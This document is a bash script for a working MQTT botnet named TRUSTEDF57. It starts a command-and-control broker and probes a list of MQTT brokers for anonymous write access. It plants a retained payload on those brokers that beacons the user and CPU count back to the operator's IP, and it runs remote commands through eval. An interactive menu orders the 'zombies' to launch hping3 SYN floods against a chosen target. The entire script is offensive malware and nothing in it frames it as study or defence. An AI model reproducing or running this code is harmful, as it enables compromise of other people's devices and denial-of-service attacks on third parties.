#!/bin/bash
# TRUSTEDF57 v4.1 - FIXED SYNTAX + XARGS
# Rimossi backslash problematici + bash strict

set -euo pipefail

clear
echo "🔥 TRUSTEDF57 v4.1 - SYNTAX FIXED"
echo "================================="

C2_PORT=1883
LISTENER_PORT=1884
MY_IP=$(curl -s --max-time 3 ifconfig.me || curl -s icanhazip.com || hostname -I | awk '{print $1}' || echo "127.0.0.1")

BROKERS_VALID=0
BROKERS_INFECTED=0
ZOMBIES_ACTIVE=0
ZOMBIES_TOTAL=0

setup_c2() {
    apt update -qq >/dev/null 2>&1
    apt install -y mosquitto mosquitto-clients hping3 netcat-openbsd >/dev/null 2>&1
    
    cat > /tmp/mosquitto_c2.conf << EOF
listener $LISTENER_PORT
allow_anonymous true
persistence false
log_type none
EOF
    
    mosquitto -c /tmp/mosquitto_c2.conf -d >/dev/null 2>&1 &
    sleep 3
    echo "✅ C2: localhost:$LISTENER_PORT"
}

test_broker() {
    local ip="$1"
    for topic in "/update" "/sys" "/device/config" "/mqtt"; do
        if timeout 2 mosquitto_pub -h "$ip" -p 1883 -t "$topic" -m "test" >/dev/null 2>&1; then
            echo "$ip:1883"
            return 0
        fi
    done
    return 1
}

infect_single() {
    local ip="$1"
    local payload='#!/bin/bash
C2_HOST="'"$MY_IP"'"
LOOP="/tmp/z_'"${MY_IP//./_}"'"
[ -f "$LOOP" ] && exit
touch "$LOOP"
while true; do
  mosquitto_pub -h $C2_HOST -p 1884 -t "/alive" -m "$(id):$(nproc)" >/dev/null 2>&1 || sleep 30
  mosquitto_sub -h $C2_HOST -p 1884 -t "/cmd/#" -C 1 2>/dev/null | while read topic cmd; do
    case $cmd in
      kill) rm "$LOOP"; exit ;;
      ddos:*) eval "${cmd#ddos:}" & ;;
    esac
  done || sleep 15
done'

    for topic in "/update" "/sys" "/device/config"; do
        timeout 3 mosquitto_pub -h "$ip" -p 1883 -t "$topic" -m "$payload" --retain >/dev/null 2>&1 &
    done
}

infect_all() {
    if [[ ! -s brokers.txt ]]; then
        echo "❌ brokers.txt vuoto!"
        return 1
    fi
    
    echo "🧪 Test auth..."
    > valid_brokers.txt
    
    # FIXED XARGS - semplice loop parallel sicuro
    ips=($(awk '{print $1}' brokers.txt | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u))
    
    for ip in "${ips[@]}"; do
        if test_broker "$ip"; then
            echo "$ip:1883" >> valid_brokers.txt
        fi
    done &>/dev/null &
    
    wait
    BROKERS_VALID=$(wc -l < valid_brokers.txt 2>/dev/null || echo 0)
    
    if [[ $BROKERS_VALID -eq 0 ]]; then
        echo "❌ No valid brokers"
        return 1
    fi
    
    echo "✅ $BROKERS_VALID valid → Infecting..."
    
    # Infect parallel semplice
    while read ip_port; do
        ip="${ip_port%:*}"
        infect_single "$ip" &
    done < valid_brokers.txt
    
    wait
    BROKERS_INFECTED=$BROKERS_VALID
    echo "🎉 $BROKERS_INFECTED infected!"
}

ddos_menu() {
    read -r -p "🎯 IP:PORT: " target
    target="${target:-8.8.8.8:80}"
    read -r -p "⏱️ Sec: " duration
    duration="${duration:-60}"
    
    cmd="ddos:hping3 --flood -S -p${target#*:} -d 1200 ${target%:*} & sleep $duration; killall hping3"
    mosquitto_pub -h localhost -p $LISTENER_PORT -t "/sys/update/cmd" -m "$cmd"
    
    (sleep "$duration" && mosquitto_pub -h localhost -p $LISTENER_PORT -t "/sys/update/cmd" -m "kill") &
    echo "💥 DDoS $target ($duration s)"
}

monitor_zombies() {
    mosquitto_sub -h localhost -p $LISTENER_PORT -t "/alive" 2>/dev/null | while IFS=: read -r user cpu rest; do
        ((ZOMBIES_TOTAL++))
        echo "✅ Zombie #$ZOMBIES_TOTAL: $user ($cpu cores)"
    done &
}

show_menu() {
    clear
    echo "🔥 TRUSTEDF57 v4.1"
    echo "C2: $MY_IP:$LISTENER_PORT"
    echo "===================="
    echo "📊 Brokers: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
    echo "   Valid: $BROKERS_VALID | Infected: $BROKERS_INFECTED"
    echo "   🧟 Zombies: $ZOMBIES_TOTAL"
    echo ""
    echo "1) 🧪+🦠 Infect"
    echo "2) 💥 DDoS"
    echo "3) 📡 Monitor 30s"
    echo "4) 🛑 Kill all"
    echo "5) ❌ Exit"
}

main() {
    setup_c2
    monitor_zombies &
    
    while true; do
        show_menu
        read -r choice
        
        case $choice in
            1) infect_all ;;
            2) ddos_menu ;;
            3) echo "📡 Listening..."; sleep 30 ;;
            4) mosquitto_pub -h localhost -p $LISTENER_PORT -t "/sys/update/cmd" -m "kill" ;;
            5) pkill -f mosquitto; exit 0 ;;
            *) echo "❌ 1-5" ;;
        esac
        read -p $'\n[ENTER]...'
    done
}

main
